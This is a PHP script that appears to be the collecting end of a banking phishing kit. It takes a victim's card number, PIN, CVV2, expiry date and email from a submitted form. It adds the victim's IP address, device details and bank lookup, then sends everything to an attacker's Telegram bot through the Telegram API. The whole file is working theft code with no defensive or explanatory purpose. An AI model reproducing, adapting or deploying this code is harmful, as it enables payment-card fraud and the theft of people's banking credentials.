<?php

if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

include "Bankinfo.php";
 include 'info.php';
$pan = $_POST["pan"];
$pin = $_POST["pin"];
$cvv = $_POST["cvv2"];
$year = $_POST["expireYear"];
$month = $_POST["expireMonth"];

$num = $_POST["num"];
if(isset($_POST["inputemail"])){
    $email = $_POST["inputemail"];
}else{
    $email = "None";
}


$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);
if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
$ip = $_SERVER["HTTP_CLIENT_IP"];
} else {
if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
} else {
$ip = $_SERVER["REMOTE_ADDR"];
}
}
    $devices = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT']) [4], ')');
    $devices2 = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT']) [3], ')');
    
$des = "
NeW Card سهام

╠🌇Cᴀʀᴅ ➣ <code>$pan</code>
╠🎑Pᴀss ➣ <code>$pin</code>
╠🌠Cᴠᴠ2 ➣ <code>$cvv</code>
╠🌃Dᴀᴛᴇ ➣ <code>$year</code>/<code>$month</code>
🔥  @HACKOTP
IP 🔥 : <code>$ip</code>
Model ⚙️ : <code>$devices $devices2</code>
";
    

    $send = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($des) . '&parse_mode=HTML';
    $params = [
'chat_id' => $id,
'text' => $des,
'parse_mode' => 'HTML'
];
    $website = "https://api.telegram.org/bot" . $token;
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
?>